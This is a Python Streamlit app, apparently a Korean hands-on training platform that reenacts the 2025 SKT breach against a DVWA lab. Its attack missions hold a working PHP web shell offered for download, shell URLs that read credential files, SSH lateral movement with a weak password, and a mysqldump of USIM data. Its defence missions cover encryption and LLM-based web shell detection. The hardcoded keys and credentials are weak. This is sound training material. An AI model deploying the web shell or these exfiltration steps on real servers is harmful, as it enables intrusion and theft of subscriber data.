import streamlit as st
import plotly.graph_objects as go
from openai import OpenAI
from dotenv import load_dotenv
import os
import json

load_dotenv()
client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))

# ============================
# 설정
# ============================
SERVER_A_IP = "3.38.102.179"
SERVER_B_IP = "10.0.2.115"
TERMINAL_URL = f"http://{SERVER_A_IP}:3000"
DVWA_URL = f"http://{SERVER_A_IP}/dvwa"
DVWA_UPLOAD_URL = f"http://{SERVER_A_IP}/dvwa/vulnerabilities/upload/"

st.set_page_config(
    page_title="SKT 침해사고 체험 플랫폼",
    page_icon="🔐",
    layout="wide"
)

# ============================
# 사이드바
# ============================
st.sidebar.title("🎯 미션 진행 상태")
st.sidebar.markdown("---")

missions = [
    "1단계: 웹쉘 업로드",
    "2단계: 계정정보 탈취",
    "3단계: Lateral Movement",
    "4단계: DB 탈취",
    "방어1: 계정정보 암호화",
    "방어2: 웹쉘 탐지",
    "방어3: DB 암호화",
]

if "completed" not in st.session_state:
    st.session_state.completed = {k: False for k in missions}

for mission in missions:
    if st.session_state.completed[mission]:
        st.sidebar.success(f"✅ {mission}")
    else:
        st.sidebar.warning(f"⬜ {mission}")

progress = sum(st.session_state.completed.values()) / len(missions)
st.sidebar.progress(progress)
st.sidebar.markdown(f"**진행률: {int(progress * 100)}%**")
st.sidebar.markdown("---")

if st.sidebar.button("🔄 환경 초기화"):
    st.session_state.completed = {k: False for k in missions}
    st.sidebar.success("초기화 완료! 다음 사람 준비됐어요.")
    st.rerun()

# ============================
# 터미널 버튼 컴포넌트
# ============================
def terminal_button():
    st.markdown(f"""
<a href="{TERMINAL_URL}" target="_blank">
<button style="
    background-color:#1e1e1e;
    color:#00ff00;
    border:1px solid #444;
    padding:10px 20px;
    border-radius:8px;
    font-family:'Courier New',monospace;
    font-size:18px;
    cursor:pointer;
    width:100%;
    text-align:left;
">
    🖥️ 터미널 열기
</button>
</a>
""", unsafe_allow_html=True)

def dvwa_button(label, url):
    st.markdown(f"""
<a href="{url}" target="_blank">
<button style="
    background-color:#2c3e50;
    color:#ffffff;
    border:1px solid #444;
    padding:10px 20px;
    border-radius:8px;
    font-family:sans-serif;
    font-size:16px;
    cursor:pointer;
    width:100%;
    text-align:center;
">
    {label}
</button>
</a>
""", unsafe_allow_html=True)

# ============================
# 메인
# ============================
st.title("🔐 SKT 침해사고 체험 플랫폼")
st.markdown("2025년 SKT 침해사고 공격 흐름을 직접 체험하고 방어해보세요.")
st.markdown("---")

tab1, tab2, tab3 = st.tabs(["🗡️ 공격 시나리오", "🛡️ 방어 시나리오", "📊 분석 리포트"])

# ============================
# 탭1 - 공격 시나리오
# ============================
with tab1:
    st.header("🗡️ 공격 시나리오")
    st.info("단계별 미션을 순서대로 진행하세요.")

    # 1단계
    with st.expander("1단계 — 웹쉘 업로드 🔴", expanded=True):
        col1, col2 = st.columns([1, 1])

        with col1:
            st.markdown("""
### 📋 미션 설명
DVWA에 웹쉘 파일을 업로드해서 서버를 장악하세요.

### 🔍 배경
SKT 사건에서 공격자는 웹쉘을 서버에 업로드해서
원격으로 명령을 실행했습니다.

### 💻 웹쉘 코드
```php
<?php system($_GET['cmd']); ?>
```

### 📌 실습 순서
1. 아래 버튼으로 shell.php 다운로드
2. DVWA 접속 버튼 클릭
3. 로그인 (admin / password)
4. File Upload 메뉴 클릭
5. shell.php 업로드
6. 아래 URL로 동작 확인
""")
            st.code(f"http://{SERVER_A_IP}/dvwa/hackable/uploads/shell.php?cmd=whoami")
            st.markdown("`www-data` 가 출력되면 성공입니다.")

        with col2:
            st.markdown("### 📥 웹쉘 파일 다운로드")
            shell_code = '<?php system($_GET["cmd"]); ?>'
            st.download_button(
                label="📥 shell.php 다운로드",
                data=shell_code,
                file_name="shell.php",
                mime="text/plain",
                key="download_shell"
            )

            st.markdown("### 🌐 DVWA 접속")
            dvwa_button("🌐 DVWA File Upload 열기", DVWA_UPLOAD_URL)

            st.markdown("---")
            st.markdown("### ⚠️ 취약점 설명")
            st.error("""
**왜 위험한가?**
파일 업로드 기능에 확장자 검증이 없어서
PHP 파일을 업로드하면 서버에서 실행됩니다.
SKT 사건에서도 이 방식으로 서버가 장악됐습니다.
""")
            st.markdown("### ✅ 미션 완료 조건")
            st.markdown("`whoami` 명령 실행 시 `www-data` 출력")
            if st.button("✅ 1단계 완료", key="btn1"):
                st.session_state.completed["1단계: 웹쉘 업로드"] = True
                st.success("1단계 완료! 서버 장악 성공!")
                st.balloons()

    # 2단계
    with st.expander("2단계 — 평문 계정정보 탈취 🔴"):
        col1, col2 = st.columns([1, 1])

        with col1:
            st.markdown("""
### 📋 미션 설명
웹쉘을 이용해 서버 안에 저장된 계정정보를 탈취하세요.

### 🔍 배경
SKT 사건에서 서버에 계정정보가 평문으로 저장되어 있었고
공격자가 이를 탈취해 내부망으로 이동했습니다.

### 📌 실습 순서
1. 아래 URL을 브라우저에서 열기
""")
            st.code(f"http://{SERVER_A_IP}/dvwa/hackable/uploads/shell.php?cmd=cat+/var/www/html/dvwa/config/server_info.txt")
            st.markdown("또는 터미널에서")
            st.code("cat /var/www/html/dvwa/config/server_info.txt")

        with col2:
            st.markdown("### 🖥️ 실습 환경 접속")
            terminal_button()
            st.markdown("---")
            st.markdown("### ⚠️ 취약점 설명")
            st.error("""
**왜 위험한가?**
계정정보가 평문으로 저장되어 있어서
서버가 장악되면 내부 모든 서버의 접속 정보가
한번에 노출됩니다.
""")
            st.markdown("### ✅ 미션 완료 조건")
            st.markdown("ServerB IP, ID, PW 확인")
            if st.button("✅ 2단계 완료", key="btn2"):
                st.session_state.completed["2단계: 계정정보 탈취"] = True
                st.success("2단계 완료! 계정정보 탈취 성공!")

    # 3단계
    with st.expander("3단계 — Lateral Movement 🔴"):
        col1, col2 = st.columns([1, 1])

        with col1:
            st.markdown("""
### 📋 미션 설명
탈취한 계정정보로 내부 DB 서버에 접속하세요.

### 🔍 배경
SKT 사건에서 공격자는 탈취한 계정정보로
시스템 관리망에서 코어망으로 이동했습니다.

### 📌 실습 순서
1. 터미널 접속
2. 아래 명령어 실행
""")
            st.code(f"ssh dbadmin@{SERVER_B_IP}")
            st.markdown("비밀번호: `1234`")
            st.markdown("`dbadmin@ServerB:~$` 프롬프트 뜨면 성공!")

        with col2:
            st.markdown("### 🖥️ 실습 환경 접속")
            terminal_button()
            st.markdown("---")
            st.markdown("### ⚠️ 취약점 설명")
            st.error("""
**왜 위험한가?**
내부망 서버 간 인증이 단순 ID/PW로만 되어 있고
비밀번호가 평문으로 노출되어 있어서
한 서버가 뚫리면 내부망 전체가 위험합니다.
""")
            st.markdown("### ✅ 미션 완료 조건")
            st.markdown("`dbadmin@ServerB:~$` 프롬프트 확인")
            if st.button("✅ 3단계 완료", key="btn3"):
                st.session_state.completed["3단계: Lateral Movement"] = True
                st.success("3단계 완료! 내부 서버 이동 성공!")

    # 4단계
    with st.expander("4단계 — DB 데이터 탈취 🔴"):
        col1, col2 = st.columns([1, 1])

        with col1:
            st.markdown("""
### 📋 미션 설명
DB 서버에서 유심정보 데이터를 탈취하세요.

### 🔍 배경
SKT 사건에서 공격자는 유심정보 9.82GB를 외부로 유출했습니다.

### 📌 실습 순서
1. ServerB 접속 상태에서
2. 아래 명령어 실행
""")
            st.code("""mysql -u dbadmin -p1234 simdb
SELECT * FROM usim;
mysqldump -u dbadmin -p1234 simdb > /tmp/stolen_data.sql""")

        with col2:
            st.markdown("### 🖥️ 실습 환경 접속")
            terminal_button()
            st.markdown("---")
            st.markdown("### ⚠️ 취약점 설명")
            st.error("""
**왜 위험한가?**
DB 데이터가 암호화되지 않아서
탈취 즉시 유심 복제 등 2차 피해가 가능합니다.
""")
            st.markdown("### ✅ 미션 완료 조건")
            st.markdown("유심 데이터 조회 확인")
            if st.button("✅ 4단계 완료", key="btn4"):
                st.session_state.completed["4단계: DB 탈취"] = True
                st.success("4단계 완료!")
                st.error("💀 공격 성공! 2,696만 건 유출 시뮬레이션 완료")

# ============================
# 탭2 - 방어 시나리오
# ============================
with tab2:
    st.header("🛡️ 방어 시나리오")
    st.info("공격을 막기 위한 방어 조치를 직접 적용해보세요.")

    # 방어1
    with st.expander("방어1 — 계정정보 암호화 🔵", expanded=True):
        col1, col2 = st.columns([1, 1])

        with col1:
            st.markdown("""
### 📋 미션 설명
평문으로 저장된 계정정보를 암호화하세요.

### 📌 실습 순서
1. 터미널 접속
2. 아래 명령어 실행
""")
            st.code("""sudo openssl enc -aes-256-cbc -pbkdf2 \\
-in /var/www/html/dvwa/config/server_info.txt \\
-out /var/www/html/dvwa/config/server_info.enc \\
-k secretkey123

sudo rm /var/www/html/dvwa/config/server_info.txt""")
            st.markdown("3. 동일 공격 재시도")
            st.code(f"http://{SERVER_A_IP}/dvwa/hackable/uploads/shell.php?cmd=cat+/var/www/html/dvwa/config/server_info.enc")
            st.markdown("깨진 문자만 출력되면 방어 성공!")

        with col2:
            st.markdown("### 🖥️ 실습 환경 접속")
            terminal_button()
            st.markdown("---")
            st.markdown("### 💡 방어 효과")
            st.success("""
**암호화하면 어떻게 되나?**
웹쉘로 파일을 읽어도 암호화된 값만 보여서
계정정보를 알 수 없습니다.
Lateral Movement 자체가 불가능해집니다.
""")
            if st.button("✅ 방어1 완료", key="btn5"):
                st.session_state.completed["방어1: 계정정보 암호화"] = True
                st.success("방어1 완료! Lateral Movement 차단됨")

    # 방어2
    with st.expander("방어2 — 웹쉘 탐지 🔵"):
        col1, col2 = st.columns([1, 1])

        with col1:
            st.markdown("""
### 📋 미션 설명
업로드된 웹쉘을 LLM으로 탐지하세요.

### 📌 실습 순서
1. 아래에서 PHP 파일 업로드
2. LLM 탐지 실행
3. 일반 웹쉘 / 난독화 웹쉘 / 정상 PHP 비교
""")
            uploaded_file = st.file_uploader("PHP 파일 업로드", type=["php"])
            if uploaded_file:
                code = uploaded_file.read().decode("utf-8")
                st.code(code, language="php")
                if st.button("🤖 LLM 탐지 실행"):
                    with st.spinner("LLM 분석 중..."):
                        response = client.chat.completions.create(
                            model="gpt-4o-mini",
                            messages=[
                                {
                                    "role": "system",
                                    "content": "너는 PHP 웹쉘을 탐지하는 보안 전문가야. 반드시 JSON 형식으로만 답해."
                                },
                                {
                                    "role": "user",
                                    "content": f"""아래 PHP 코드가 웹쉘인지 분석해줘.
반드시 아래 JSON 형식으로만 답해줘.
{{
    "웹쉘여부": "악성" 또는 "정상",
    "위험이유": "2~3문장 설명",
    "위험도점수": 0에서 100 사이 숫자
}}
코드:
{code}"""
                                }
                            ],
                            temperature=0
                        )
                        raw = response.choices[0].message.content.strip()
                        raw = raw.replace("```json", "").replace("```", "").strip()
                        result = json.loads(raw)
                        if result["웹쉘여부"] == "악성":
                            st.error(f"🚨 악성 탐지! 위험도: {result['위험도점수']}/100")
                        else:
                            st.success(f"✅ 정상 파일. 위험도: {result['위험도점수']}/100")
                        st.info(f"분석: {result['위험이유']}")
                        st.session_state.completed["방어2: 웹쉘 탐지"] = True

        with col2:
            st.markdown("### 💡 방어 효과")
            st.success("""
**LLM 탐지가 왜 필요한가?**
기존 시그니처 기반의 탐지 도구는 알려진 패턴만 탐지해서
난독화된 웹쉘을 탐지하지 못합니다.

그에 반해, LLM은 코드 의미를 이해해서
난독화 여부와 관계없이 탐지 가능합니다.
""")

    # 방어3
    with st.expander("방어3 — DB 암호화 🔵"):
        col1, col2 = st.columns([1, 1])

        with col1:
            st.markdown("""
### 📋 미션 설명
DB의 Ki값을 암호화해서 탈취해도 사용할 수 없게 만드세요.

### 📌 실습 순서
1. 터미널 접속
2. ServerB MySQL에서 아래 명령어 실행
""")
            st.code("""mysql -u dbadmin -p1234 simdb
UPDATE usim SET Ki = HEX(AES_ENCRYPT(Ki, 'supersecretkey'));
SELECT * FROM usim;""")
            st.markdown("Ki값이 암호문으로 바뀌면 성공!")

        with col2:
            st.markdown("### 🖥️ 실습 환경 접속")
            terminal_button()
            st.markdown("---")
            st.markdown("### 💡 방어 효과")
            st.success("""
**DB 암호화하면 어떻게 되나?**
데이터를 탈취해도 Ki값을 복호화할 수 없어서
유심 복제가 불가능해집니다.
""")
            if st.button("✅ 방어3 완료", key="btn7"):
                st.session_state.completed["방어3: DB 암호화"] = True
                st.success("방어3 완료! 데이터 탈취해도 사용 불가")

# ============================
# 탭3 - 분석 리포트
# ============================
with tab3:
    st.header("📊 LLM 보안 분석 리포트")
    completed_count = sum(st.session_state.completed.values())

    if completed_count < 4:
        st.warning(f"공격 시나리오 4단계를 모두 완료하면 분석 리포트가 생성됩니다. (현재 {completed_count}/4)")
    else:
        st.success("공격 시나리오 완료! 분석 리포트를 생성할 수 있어요.")
        if st.button("🤖 LLM 분석 리포트 생성"):
            with st.spinner("ATT&CK / STRIDE / DREAD 분석 중..."):
                response = client.chat.completions.create(
                    model="gpt-4o-mini",
                    messages=[
                        {
                            "role": "system",
                            "content": "너는 침해사고 분석 전문가야. 반드시 JSON 형식으로만 답해."
                        },
                        {
                            "role": "user",
                            "content": """{
    "요청": "SKT 침해사고 공격 흐름 분석",
    "공격단계": ["웹쉘 업로드", "평문 계정정보 탈취", "SSH Lateral Movement", "DB 데이터 탈취"],
    "출력형식": {
        "단계별분석": [
            {
                "단계": "단계명",
                "ATTCK": "기법 ID와 이름",
                "STRIDE": "분류",
                "DREAD": {
                    "피해규모": 1,
                    "재현가능성": 1,
                    "악용가능성": 1,
                    "영향받는사용자": 1,
                    "발견가능성": 1
                },
                "대응방안": "대응 방안 설명"
            }
        ]
    }
}"""
                        }
                    ],
                    temperature=0
                )
                raw = response.choices[0].message.content.strip()
                raw = raw.replace("```json", "").replace("```", "").strip()
                result = json.loads(raw)

                st.subheader("🎯 ATT&CK 매핑")
                attck_data = {
                    "단계": [d["단계"] for d in result["단계별분석"]],
                    "ATT&CK 기법": [d["ATTCK"] for d in result["단계별분석"]],
                    "STRIDE": [d["STRIDE"] for d in result["단계별분석"]],
                }
                st.table(attck_data)

                st.subheader("📡 DREAD 위험도 레이더 차트")
                categories = ["피해규모", "재현가능성", "악용가능성", "영향받는사용자", "발견가능성"]
                fig = go.Figure()
                for stage in result["단계별분석"]:
                    values = [int(stage["DREAD"][c]) for c in categories]
                    values.append(values[0])
                    fig.add_trace(go.Scatterpolar(
                        r=values,
                        theta=categories + [categories[0]],
                        fill='toself',
                        name=stage["단계"]
                    ))
                fig.update_layout(
                    polar=dict(radialaxis=dict(visible=True, range=[0, 10])),
                    showlegend=True
                )
                st.plotly_chart(fig, use_container_width=True)

                st.subheader("🛡️ 단계별 대응 방안")
                for stage in result["단계별분석"]:
                    with st.expander(f"{stage['단계']}"):
                        st.write(stage["대응방안"])